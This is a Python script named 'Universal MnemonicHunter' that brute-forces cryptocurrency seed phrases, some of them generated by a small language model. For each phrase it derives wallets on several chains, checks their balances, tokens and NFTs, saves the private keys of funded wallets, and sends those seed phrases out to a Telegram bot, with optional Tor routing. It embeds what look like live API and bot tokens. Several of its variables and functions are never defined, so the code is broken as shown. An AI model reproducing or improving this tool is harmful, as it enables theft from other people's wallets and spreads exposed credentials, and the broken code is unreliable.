#!/usr/bin/env python3
import os
import time
import json
import random
import argparse
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from eth_account import Account
from web3 import Web3, HTTPProvider
from web3.exceptions import BadFunctionCallOutput

# —— AI deps ——
from transformers import GPT2LMHeadModel, GPT2Tokenizer
import torch

# —— ARGS ——
parser = argparse.ArgumentParser(description="Universal MnemonicHunter v2.0")
parser.add_argument("-l","--length",    type=int, choices=[12,24], default=12,  help="Mnemonic length")
parser.add_argument("-w","--workers",   type=int, default=5,                   help="Number of threads")
parser.add_argument("-t","--threshold", type=float, default=0.0005,            help="Min coin balance to count as hit")
parser.add_argument("-i","--index-end", type=int, default=0,                   help="Max derivation index (0…N)")
parser.add_argument("--use-tor",        action="store_true",                  help="Route HTTP(S) through Tor")
parser.add_argument("--networks",       nargs="+",
                    choices=["btc","eth","bsc","ltc","doge"],
                    default=["btc","eth","bsc"],
                    help="Chains to scan")
parser.add_argument("--language",       choices=["english","french","japanese","chinese_simplified"],
                    default="english",                                      help="BIP39 wordlist language")
parser.add_argument("--smart",          action="store_true",                  help="Enable AI‑powered mnemonic generation")
parser.add_argument("--known",          type=str, default="",                   help="Lock in known words e.g. 3:apple,7:wallet")
args = parser.parse_args()

# parse known partial mnemonic (1‑based positions)
KNOWN = {}
if args.known:
    for pair in args.known.split(","):
        idx, w = pair.split(":")
        KNOWN[int(idx)-1] = w

WORDLIST_PATH = "Prioritized.txt"
TRIED_FILE    = "tried.txt"
HITS_FILE     = "hits.txt"
METRICS_FILE  = "metrics.json"
TOKENS_FILE   = "tokens.json"

INFURA_ID     = "41e8dd31743c4a7ea753feb6ea5fbe66"
ETH_RPC       = f"https://mainnet.infura.io/v3/{41e8dd31743c4a7ea753feb6ea5fbe66}"
BSC_RPC       = "https://bsc-dataseed.binance.org/"

# Optional Telegram alerts
TELEGRAM_ENABLED = True
TELEGRAM_TOKEN   = "7815117778:AAFTZ8KzLeyngpYCVdMaIcnQFtPPa1ahOAA"
TELEGRAM_CHAT_ID = "5906536988"

# —— DERIVATION PATHS ——
BTC_PATHS  = ["m/44'/0'/0'/0/{}", "m/49'/0'/0'/0/{}", "m/84'/0'/0'/0/{}"]
ETH_PATHS  = ["m/44'/60'/0'/0/{}"]
BSC_PATHS  = ["m/44'/60'/0'/0/{}"]
LTC_PATHS  = ["m/44'/2'/0'/0/{}",   "m/84'/2'/0'/0/{}"]
DOGE_PATHS = ["m/44'/3'/0'/0/{}"]

# —— SETUP ——
Account.enable_unaudited_hdwallet_features()
proxies = {"http":"socks5h://127.0.0.1:9050","https":"socks5h://127.0.0.1:9050"} if USE_TOR else None

# Web3 clients
web3_clients = {}
if "eth" in SCAN_NETWORKS:
    w3 = Web3(HTTPProvider(ETH_RPC, request_kwargs={"proxies":proxies} if proxies else {}))
    if not w3.is_connected(): print("❌ ETH RPC failed"); exit(1)
    web3_clients["eth"] = w3
if "bsc" in SCAN_NETWORKS:
    w3 = Web3(HTTPProvider(BSC_RPC, request_kwargs={"proxies":proxies} if proxies else {}))
    if not w3.is_connected(): print("❌ BSC RPC failed"); exit(1)
    web3_clients["bsc"] = w3

# BIP39 generator
mnemo = Mnemonic(LANGUAGE)

# —— LOAD TOKEN CONTRACTS ——
try:
    TOKEN_CONTRACTS = json.load(open(TOKENS_FILE))
except:
    TOKEN_CONTRACTS = {}

ABI_ERC20 = [{
    "constant":True,"inputs":[{"name":"_owner","type":"address"}],
    "name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],
    "type":"function"
}]

def get_token_balances(addr, network):
    balances = {}
    client = web3_clients.get(network)
    for sym, ctr in TOKEN_CONTRACTS.get(network, {}).items():
        token = client.eth.contract(address=ctr, abi=ABI_ERC20)
        try:
            raw = token.functions.balanceOf(addr).call()
            if raw > 0:
                balances[sym] = raw/1e18
        except BadFunctionCallOutput:
            continue
    return balances

def get_nfts(addr, network):
    url = f"https://api.opensea.io/api/v1/assets?owner={addr}&limit=5"
    try:
        data = requests.get(url, timeout=5).json().get("assets", [])
        return [a.get("name","<unknown>") for a in data if a.get("name")]
    except:
        return []

# —— METRICS THREAD ——
phrases_tested = 0
start_time     = time.time()

def print_metrics():
    time.sleep(5)
    elapsed = time.time() - start_time
    rate    = phrases_tested / elapsed if elapsed>0 else 0.0
    metrics = {"tested":phrases_tested, "speed":round(rate,2), "elapsed":int(elapsed)}
    with open(METRICS_FILE,"w") as mf:
        json.dump(metrics, mf)
    print(f"[METRICS] Tested={metrics['tested']} Speed={metrics['speed']} p/s Elapsed={metrics['elapsed']}s")

threading.Thread(target=print_metrics, daemon=True).start()

# —— UTILITIES ——
def load_wordlist():
    with open(WORDLIST_PATH,"r",encoding="utf-8") as f:
        return [w.strip() for w in f if w.strip()]

def already_tried(ph):
    if not os.path.exists(TRIED_FILE): return False
    return ph in open(TRIED_FILE).read().splitlines()

def save_tried(ph):
    with open(TRIED_FILE,"a") as f: f.write(ph+"\n")

def save_hit(coin, ph, addr, priv, bal):
    with open(HITS_FILE,"a") as f:
        f.write(f"[{coin.upper()}] {datetime.utcnow().isoformat()} {addr} = {bal} priv={priv}\n{ph}\n\n")

def send_telegram(coin, addr, bal, ph):
    if not TELEGRAM_ENABLED: return
    msg = f"🔥{coin.upper()} HIT! Balance={bal}\\nAddr={addr}\\n{ph}"
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
        data={"chat_id":TELEGRAM_CHAT_ID,"text":msg}
    )

# —— AI SETUP ——
if USE_SMART:
    print("🔮 Loading DistilGPT2 for smart mnemonics…")
    tokenizer = GPT2Tokenizer.from_pretrained("distilgpt2")
    model     = GPT2LMHeadModel.from_pretrained("distilgpt2")
    model.eval()

def ai_generate_phrase(wordlist):
    seed_words = random.sample(wordlist, 4)
    prompt     = " ".join(seed_words)
    inputs     = tokenizer(prompt, return_tensors="pt")
    out = model.generate(
        inputs.input_ids,
        max_length=len(inputs.input_ids[0])+MNEMONIC_LENGTH,
        temperature=0.9, top_p=0.95, do_sample=True,
        pad_token_id=tokenizer.eos_token_id
    )
    text   = tokenizer.decode(out[0], skip_special_tokens=True)
    cand   = text.split()[len(seed_words):len(seed_words)+MNEMONIC_LENGTH]
    phrase = " ".join(cand)
    return phrase if mnemo.check(phrase) else None

def generate_phrase(wordlist):
    if USE_SMART and random.random()<0.3:
        ph = ai_generate_phrase(wordlist)
        if ph: return ph
    if KNOWN:
        slots = [None]*MNEMONIC_LENGTH
        for pos,w in KNOWN.items(): slots[pos]=w
        unk  = [i for i in range(MNEMONIC_LENGTH) if i not in KNOWN]
        pick = random.sample(wordlist,len(unk))
        for i,w in zip(unk,pick): slots[i]=w
        phr = " ".join(slots)
        if mnemo.check(phr): return phr
    bits = 128 if MNEMONIC_LENGTH==12 else 256
    return mnemo.generate(strength=bits)

def process_phrase(phrase, wordlist):
    global phrases_tested
    if already_tried(phrase): return
    save_tried(phrase)
    phrases_tested += 1

    seed = Bip39SeedGenerator(phrase).Generate()

    # BTC
    if "btc" in SCAN_NETWORKS:
        for tpl in BTC_PATHS:
            for idx in range(INDEX_END+1):
                acct = (
                    Bip44
                    .FromSeed(seed, Bip44Coins.BITCOIN)
                    .Purpose().Coin().Account(0)
                    .Change(Bip44Changes.CHAIN_EXT)
                    .AddressIndex(idx)
                )
                addr = acct.PublicKey().ToAddress()
                priv = acct.PrivateKey().ToWif()
                bal  = get_btc_balance(addr)
                if bal>=BALANCE_THRESHOLD:
                    save_hit("btc",phrase,addr,priv,bal)
                    send_telegram("BTC",addr,bal,phrase)

    # ETH/BSC
    for net, paths in (("eth",ETH_PATHS),("bsc",BSC_PATHS)):
        if net in SCAN_NETWORKS:
            w3 = web3_clients[net]
            for tpl in paths:
                for idx in range(INDEX_END+1):
                    path = tpl.format(idx)
                    acct = Account.from_mnemonic(phrase, account_path=path)
                    addr,priv = acct.address, acct.key.hex()
                    try: bal = w3.eth.get_balance(addr)/1e18
                    except: bal = 0.0
                    if bal>=BALANCE_THRESHOLD:
                        save_hit(net,phrase,addr,priv,bal)
                        send_telegram(net.upper(),addr,bal,phrase)
                    tok_bal = get_token_balances(addr,net)                                                          
                    for sym,amt in tok_bal.items():
                        save_hit(f"{net}-{sym}",phrase,addr,priv,amt)
                        send_telegram(f"{net.upper()} {sym}",addr,amt,phrase)
                    nfts = get_nfts(addr,net)
                    if nfts:
                        save_hit(f"{net}-NFT",phrase,addr,priv,nfts)
                        send_telegram(f"{net.upper()} NFT",addr,nfts,phrase)

    # LTC
    if "ltc" in SCAN_NETWORKS:
            for tpl in LTC_PATHS:
                    for idx in range(INDEX_END+1):
                        acct = (
                                Bip44
                                .FromSeed(seed, Bip44Coins.LITECOIN)
                                .Purpose().Coin().Account(0)
                                .Change(Bip44Changes.CHAIN_EXT)
                                .AddressIndex(idx)
                        )
                        addr = acct.PublicKey().ToAddress()
                        priv = acct.PrivateKey().ToWif()
                        bal  = get_ltc_balance(addr)
                        if bal>=BALANCE_THRESHOLD:
                            save_hit("ltc",phrase,addr,priv,bal)
                            send_telegram("LTC",addr,bal,phrase)

    # DOGE
    if "doge" in SCAN_NETWORKS:
            for tpl in DOGE_PATHS:
                    for idx in range(INDEX_END+1):
                        acct = (
                                Bip44
                                .FromSeed(seed, Bip44Coins.DOGECOIN)
                                .Purpose().Coin().Account(0)
                                .Change(Bip44Changes.CHAIN_EXT)
                                .AddressIndex(idx)
                        )
                        addr = acct.PublicKey().ToAddress()
                        priv = acct.PrivateKey().ToWif()
                        bal  = get_doge_balance(addr)
                        if bal>=BALANCE_THRESHOLD:
                            save_hit("doge",phrase,addr,priv,bal)

def main():
    wordlist = load_wordlist()
    print(f"🌟 Loaded {len(wordlist)} words from {WORDLIST_PATH}")
    with ThreadPoolExecutor(max_workers=NUM_WORKERS) as exe:
         while True:
            ph = generate_phrase(wordlist)
            exe.submit(process_phrase, ph, wordlist)
            time.sleep(0.1)

if __name__=="__main__":
    main()
    